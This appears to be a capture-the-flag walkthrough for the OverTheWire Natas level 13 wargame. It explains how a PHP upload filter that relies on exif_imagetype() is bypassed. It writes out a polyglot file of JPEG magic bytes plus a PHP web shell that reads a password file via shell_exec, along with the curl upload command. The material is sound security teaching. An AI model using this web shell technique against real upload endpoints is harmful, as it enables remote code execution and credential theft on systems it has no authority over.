> **Level Goal:** Find the password for the next level.

---

## Connection Details

| Field    | Value                                                        |
| -------- | ------------------------------------------------------------ |
| URL      | `http://natas13.natas.labs.overthewire.org`                  |
| Username | `natas13`                                                    |
| Password | *found in [Natas Level 11 → 12](natas-level-11-level-12.md)* |

---

## Tools Used

- A web browser
- **View sourcecode** — the page links to its own PHP source
- **`echo` with `-e` / `-n` flags** — to prepend raw binary bytes to the payload file
- **`curl`** — to upload the forged file and control the saved extension

---

## Solution

### Step 1 — Open the URL

Navigate to `http://natas13.natas.labs.overthewire.org` and log in with the password from Level 12.

The page looks nearly identical to Level 12 — the same upload form — but with one new message: **"For security reasons, we now only accept image files!"** Click **View sourcecode**.

---

### Step 2 — Read the Source Code

The structure is identical to Level 12 with one added check:

```php
<?php
function genRandomString() {
    $length = 10;
    $characters = "0123456789abcdefghijklmnopqrstuvwxyz";
    $string = "";
    for ($p = 0; $p < $length; $p++) {
        $string .= $characters[mt_rand(0, strlen($characters)-1)];
    }
    return $string;
}

function makeRandomPath($dir, $ext) {
    do {
        $path = $dir."/".genRandomString().".".$ext;
    } while(file_exists($path));
    return $path;
}

function makeRandomPathFromFilename($dir, $fn) {
    $ext = pathinfo($fn, PATHINFO_EXTENSION);
    return makeRandomPath($dir, $ext);
}

if(array_key_exists("filename", $_POST)) {
    $target_path = makeRandomPathFromFilename("upload", $_POST["filename"]);
    $err = $_FILES['uploadedfile']['error'];
    if($err) {
        if($err === 2) {
            echo "The uploaded file exceeds MAX_FILE_SIZE";
        } else {
            echo "Something went wrong :/";
        }
    } else if(filesize($_FILES['uploadedfile']['tmp_name']) > 1000) {
        echo "File is too big";
    } else if (! exif_imagetype($_FILES['uploadedfile']['tmp_name'])) {
        echo "File is not an image";
    } else {
        if(move_uploaded_file($_FILES['uploadedfile']['tmp_name'], $target_path)) {
            echo "The file <a href=\"$target_path\">$target_path</a> has been uploaded";
        } else {
            echo "There was an error uploading the file, please try again!";
        }
    }
}
?>
```

Compared to Level 12, there are two changes.

First, an explicit error check on `$_FILES['uploadedfile']['error']` is added before the size check, it distinguishes between `UPLOAD_ERR_FORM_SIZE` (error code 2, triggered when the upload exceeds the `MAX_FILE_SIZE` form field) and any other upload error, which gets a generic message.

Second, `MAX_FILE_SIZE` is no longer in the client-side form at all, the 1000-byte limit is now enforced entirely server-side via `filesize()`, which makes it impossible to bypass by removing the hidden field. Neither change affects the exploit.

The check that matters is this one:

```php
} else if (! exif_imagetype($_FILES['uploadedfile']['tmp_name'])) {
    echo "File is not an image";
}
```

Everything else — the client-controlled `filename` POST field, the extension-based save path, the web-accessible `upload/` directory — is unchanged. The problem from Level 12 is still fully present. The question is only whether `exif_imagetype()` actually closes the gap.

---

### Understand `exif_imagetype()`

PHP's `exif_imagetype()` opens a file and reads its first few bytes. It compares those bytes against a table of known image format signatures and returns a constant if a match is found, or `false` if none match.

From the PHP documentation:

> `exif_imagetype()` reads the first bytes of an image and checks its signature.

The key phrase is _first bytes_. The function does not parse the entire file. It does not verify that the file is structurally valid as an image. It does not check that the file contains only image data. It looks at the beginning, finds a matching signature, and returns. Everything after those first bytes is invisible to it.

This is the blind spot. If you prefix any file with a recognised image signature, `exif_imagetype()` will declare it a valid image, regardless of what follows.

---

### Understand Magic Bytes

Every common binary format starts with a fixed sequence of bytes called a **magic number** (or file signature). These bytes identify the format to tools that need to know what kind of file they are dealing with — without relying on the file extension, which is easy to fake.

JPEG files always begin with the four bytes `FF D8 FF E0` or `FF D8 FF E1` (hexadecimal). The `file` (check [Bandit Level 9 → 10](Walkthroughs/bandit-level-9-level-10.md)) command on Linux uses exactly this kind of signature to identify file types. `exif_imagetype()` does the same.

The critical observation: nothing stops a file from starting with a valid image signature and continuing with arbitrary content. The image-reading tools see their signature, declare success, and stop reading. The PHP interpreter ignores everything before the opening `<?php` tag. Both tools examine only what they care about — and neither cares about what the other cares about.

This is not a bug in either tool individually. It is a category error in how the security check is applied: validating that the file _looks like an image at its start_ is not the same as validating that the file _contains only image data_.

---

### Step 3 — Craft the Forged File

The payload needs to satisfy two constraints simultaneously:

1. Its first bytes must match a recognised image signature (to pass `exif_imagetype()`)
2. It must contain a PHP code block (to execute when served as `.php`)

Both constraints are satisfied by prepending the JPEG magic bytes directly to a PHP payload. The JPEG signature is `\xFF\xD8\xFF\xE0`.

Create the file in one command:

```bash
printf '\xFF\xD8\xFF\xE0<?php echo shell_exec("cat /etc/natas_webpass/natas14"); ?>' > shell.php
```

Verify the file looks correct:

```bash
$ file shell.php
shell.php: JPEG image data
```

The `file` command confirms the JPEG signature is recognised. The PHP payload follows immediately after those four bytes.

Alternatively, build it in two steps with `echo`:

```bash
echo -n -e "\xFF\xD8\xFF\xE0" > shell.php
echo -n '<?php echo shell_exec("cat /etc/natas_webpass/natas14"); ?>' >> shell.php
```

(`-n` suppresses the trailing newline; `-e` interprets the `\x` escape sequences as literal bytes. The `>>` on the second command appends rather than overwrites.)

---

### Step 4 — Upload and Execute

Use curl to upload the forged file, overriding the `filename` field to force a `.php` extension on the server — exactly as in Level 12:

```bash
curl -u natas13:<password> \
     -F "MAX_FILE_SIZE=1000" \
     -F "filename=shell.php" \
     -F "uploadedfile=@shell.php" \
     http://natas13.natas.labs.overthewire.org/index.php
```

The server runs `exif_imagetype()` on the uploaded file, reads `\xFF\xD8\xFF\xE0`, identifies it as a JPEG, and passes the check. The file is saved under `upload/` with a `.php` extension.

The response contains the path:

```
The file upload/lo4v191hph.php has been uploaded
```

Go to that page on the browser.

The web server executes the file as PHP. The interpreter skips the leading JPEG bytes (they are outside any PHP tag), runs the `shell_exec()` call, and outputs:

```
����<password>
```

The garbled characters at the start are the JPEG magic bytes rendered as text. The password follows immediately after.

That is the password for [Natas Level 13 → 14](natas-level-13-level-14.md).

---

## Key Takeaways

- **Magic byte checks are not content validation.** `exif_imagetype()` only inspects the first bytes of a file. Adding four bytes of JPEG signature to a PHP script produces a file that is simultaneously a *valid image* (by this check) and an executable PHP file. A check that can be defeated by adding four bytes to the front of a file provides no real security.
- **Two tools examining the same file can reach different conclusions.** `exif_imagetype()` sees an image. The PHP interpreter sees a script. Both are correct within their own frame. Security checks fail when an attacker can satisfy one tool's criteria while hiding from another's. Robust validation requires inspecting the full file structure,  not just a header.
- **The PHP interpreter ignores content outside PHP tags.** `<?php ... ?>` is the delimiter the interpreter looks for. Arbitrary bytes before the opening tag are passed through as literal output, not interpreted as code. This is by design in PHP and is what makes the polyglot file work: the JPEG bytes satisfy the image checker, and the PHP block satisfies the interpreter.

---
